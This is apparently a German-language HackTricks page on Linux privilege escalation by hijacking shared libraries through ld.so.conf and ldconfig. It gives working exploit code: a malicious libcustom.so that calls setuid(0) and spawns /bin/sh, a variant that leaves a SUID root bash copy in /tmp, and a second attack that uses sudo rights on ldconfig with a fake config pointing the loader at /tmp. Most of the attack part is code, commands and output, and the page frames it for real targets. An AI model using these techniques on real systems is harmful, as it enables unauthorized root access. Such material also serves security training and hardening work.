# ld.so privesc exploit example

{{#include ../../banners/hacktricks-training.md}}

## Umgebung vorbereiten

Im folgenden Abschnitt findest du den Code der Dateien, die wir zur Vorbereitung der Umgebung verwenden werden.

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Erstelle** diese Dateien auf deinem Rechner im selben Ordner
2. **Kompiliere** die **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Kopiere** `libcustom.so` nach `/usr/lib` und aktualisiere den Cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **Kompiliere** die **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Überprüfe die Umgebung

Überprüfe, ob _libcustom.so_ aus _/usr/lib_ **geladen** wird und ob du die Binary **ausführen** kannst.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Nützliche Triage-Befehle

Beim Angriff auf ein echtes Ziel sollte der **genaue Name der Bibliothek** überprüft werden, die die Binärdatei benötigt, sowie das, was der **Loader derzeit auflöst**:
```bash
readelf -d ./sharedvuln | grep NEEDED
ldconfig -p | grep libcustom
/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null \
# x86_64; adjust for your arch
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
```
Ein paar nützliche Stolpersteine:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` **funktioniert** normalerweise nicht, da
die Umleitung von deiner aktuellen Shell durchgeführt wird. Verwende stattdessen
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- **SUID/privileged**-Binärdateien ignorieren `LD_LIBRARY_PATH`/`LD_PRELOAD` im
**secure-execution mode**, aber Verzeichnisse aus `/etc/ld.so.conf` sind weiterhin
Teil der vertrauenswürdigen Loader-Konfiguration, sodass diese Fehlkonfiguration
privilegierte Programme weiterhin beeinflussen kann.
- Bei neueren glibc-Versionen stellt der dynamische Loader außerdem
`--list-diagnostics` bereit. Dies ist hilfreich, um die Cache-Auflösung und die
Auswahl von `glibc-hwcaps`-Unterverzeichnissen zu debuggen, wenn ein Hijack nicht
wie erwartet funktioniert.

## Exploit

In diesem Szenario nehmen wir an, dass **jemand einen verwundbaren Eintrag** in
einer Datei unter _/etc/ld.so.conf/_ erstellt hat:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Der verwundbare Ordner ist _/home/ubuntu/lib_ (auf den wir Schreibzugriff haben).\
**Lade** den folgenden Code herunter und kompiliere ihn innerhalb dieses Pfads:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setuid(0);
setgid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Wenn du erwartest, dass **root** (oder ein anderes privilegiertes Konto) die verwundbare Binärdatei später ausführt, ist es normalerweise besser, ein **root-eigenes Artefakt** zu hinterlassen, anstatt eine interaktive Shell zu starten. Zum Beispiel:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Anschließend kannst du nach der privilegierten Ausführung `/tmp/rootbash -p` verwenden.

Da wir nun die **bösartige Bibliothek libcustom im falsch konfigurierten** Pfad **erstellt** haben, müssen wir auf einen **Neustart** oder darauf warten, dass der Root-Benutzer **`ldconfig`** ausführt (_falls du diese Binary als **sudo** ausführen kannst oder sie das **suid-Bit** besitzt, kannst du sie selbst ausführen_).

Sobald dies geschehen ist, **prüfe erneut**, aus welchem Pfad die ausführbare Datei `sharedvuln` die Bibliothek `libcustom.so` lädt:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Wie du sehen kannst, wird es aus **`/home/ubuntu/lib`** geladen, und wenn ein beliebiger Benutzer es ausführt, wird eine Shell ausgeführt:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Beachte, dass wir in diesem Beispiel keine Privilegien eskaliert haben. Wenn wir jedoch die ausgeführten Befehle ändern und **darauf warten, dass root oder ein anderer privilegierter Benutzer die verwundbare Binärdatei ausführt**, können wir Privilegien eskalieren.

### Andere Fehlkonfigurationen – dieselbe Schwachstelle

Im vorherigen Beispiel haben wir eine Fehlkonfiguration vorgetäuscht, bei der ein Administrator **einen nicht privilegierten Ordner innerhalb einer Konfigurationsdatei in `/etc/ld.so.conf.d/` festgelegt hat**.\
Es gibt jedoch weitere Fehlkonfigurationen, die dieselbe Schwachstelle verursachen können: Wenn du **Schreibberechtigungen** für eine **Konfigurationsdatei** in `/etc/ld.so.conf.d/`, für den Ordner `/etc/ld.so.conf.d` oder für die Datei `/etc/ld.so.conf` hast, kannst du dieselbe Schwachstelle konfigurieren und ausnutzen.

## Exploit 2

**Angenommen, du hast sudo-Berechtigungen für `ldconfig`**.\
Du kannst `ldconfig` angeben, **woher die conf-Dateien geladen werden sollen**. Dadurch können wir `ldconfig` dazu bringen, beliebige Ordner zu laden.\
Erstellen wir also die benötigten Dateien und Ordner, um "/tmp" zu laden:
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Nun, wie im **vorherigen Exploit** angegeben, **erstelle die schädliche Bibliothek in `/tmp`**.\
Und schließlich laden wir den Pfad und prüfen, von wo die Binärdatei die Bibliothek lädt:
```bash
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Wie Sie sehen können, lässt sich dieselbe Schwachstelle ausnutzen, wenn Sie sudo-Berechtigungen für `ldconfig` besitzen.**



## Referenzen

- [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [ldconfig(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
{{#include ../../banners/hacktricks-training.md}}
